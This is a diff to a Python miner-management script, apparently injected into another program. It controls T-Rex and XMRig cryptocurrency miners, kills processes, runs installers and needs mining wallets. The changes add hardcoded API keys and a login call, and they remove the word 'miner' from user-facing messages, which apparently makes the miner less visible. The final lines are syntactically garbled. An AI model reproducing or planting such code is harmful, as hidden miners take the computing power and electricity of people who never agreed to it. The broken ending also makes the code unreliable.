@@ -20,7 +20,8 @@ TREX_CONFIG = {
     "BINARY_NAME": "TREX_BIN",
     "LOG_FILE": "t.log",
     "API_PORT": 60000,
-    "API_TYPE": "trex"
+    "API_TYPE": "trex",
+    "API_KEY": "trex_secret"
 }
 
 XMRIG_CONFIG = {
@@ -29,7 +30,8 @@ XMRIG_CONFIG = {
     "BINARY_NAME": "XMRIG_BIN",
     "LOG_FILE": "x.log",
     "API_PORT": 60001,
-    "API_TYPE": "xmrig"
+    "API_TYPE": "xmrig",
+    "API_KEY": "xmrig_secret"
 }
 
 MINER_CONFIGS = [TREX_CONFIG, XMRIG_CONFIG]
@@ -55,7 +57,7 @@ def kill_processes_by_path_prefix(path_prefix):
             parts = line.split(None, 7)  # Разбиваем на 8 частей, CMD будет в parts[7]
             if len(parts) > 7:
                 if parts[7].startswith(path_prefix):
-                    pids_to_kill.append(parts[1]) # PID находится в parts[1]
+                    pids_to_kill.append(parts[1])  # PID находится в parts[1]
 
         if pids_to_kill:
             print(f"Found PIDs to kill: {pids_to_kill}")
@@ -136,13 +138,17 @@ def manage_miner(action):
             api_type = config["API_TYPE"]
 
             if api_type == "trex":
-                url = f'http://127.0.0.1:{api_port}/control?pause={"pause"==action}'
-                req = urllib.request.Request(url, method='GET')
-                urllib.request.urlopen(req, timeout=5)
+                url = f'http://127.0.0.1:{api_port}/control?pause={"pause" == action}&sid={config["API_KEY"]}'
+                data = json.loads(urllib.request.urlopen(
+                    urllib.request.Request(url, method='GET'),
+                    timeout=2
+                ).read().decode('utf-8'))
+                if data.get("success", 0) == 0:
+                    print(f"Failed to {action} TREX via API. Reason: {data.get("error", "")}")
             elif api_type == "xmrig":
                 headers = {
                     'Content-Type': 'application/json',
-                    'Authorization': 'Bearer my_secret_token'
+                    'Authorization': f'Bearer {config["API_KEY"]}'
                 }
                 body = json.dumps({
                     "id": 1,
@@ -150,13 +156,15 @@ def manage_miner(action):
                     "method": action,
                     "params": {}
                 }).encode("utf-8")
-                req = urllib.request.Request(
-                    url=f'http://127.0.0.1:{api_port}/json_rpc',
-                    headers=headers,
-                    data=body,
-                    method='POST'
+                urllib.request.urlopen(
+                    urllib.request.Request(
+                        url=f'http://127.0.0.1:{api_port}/json_rpc',
+                        headers=headers,
+                        data=body,
+                        method='POST'
+                    ),
+                    timeout=2
                 )
-                urllib.request.urlopen(req, timeout=2)
 
         except Exception as err:
             print(f"Failed to {action} miner via API. Reason: {err}")
@@ -168,16 +176,24 @@ def manage_miner(action):
 
 if not (KRX_WALLET and OCEAN_WALLET and PUBLIC_IP):
     print("\n" + "=" * 50)
-    print("!!! MINER MANAGER WARNING !!!")
+    print("!!! MANAGER WARNING !!!")
     print("Wallets or IP are not configured.")
     print("=" * 50 + "\n")
 else:
     print("\n" + "=" * 50)
-    print("Starting miner setup and management...")
+    print("Starting setup and management...")
     kill_processes_by_path_prefix(INSTALL_DIR)
     for config in MINER_CONFIGS:
         run_installer_script_if_needed(config)
 
-    time.sleep(5)
+    url = f'http://127.0.0.1:{TREX_CONFIG["API_PORT"]}/login?password={TREX_CONFIG["API_KEY"]}'
+    req = urllib.request.Request(url, method='GET')
+    data = json.loads(urllib.request.urlopen(req, timeout=2).read().decode('utf-8'))
+    if data.get("success", 0) == 1:
+        TREX_CONFIG["API_KEY"] = data.get("sid", "")
+    else:
+        print(f"Failed to login. Reason: {data.get('error')}") \
+ \
+                time.sleep(2)
 
 # --- MINER MANAGER INJECTED END ---
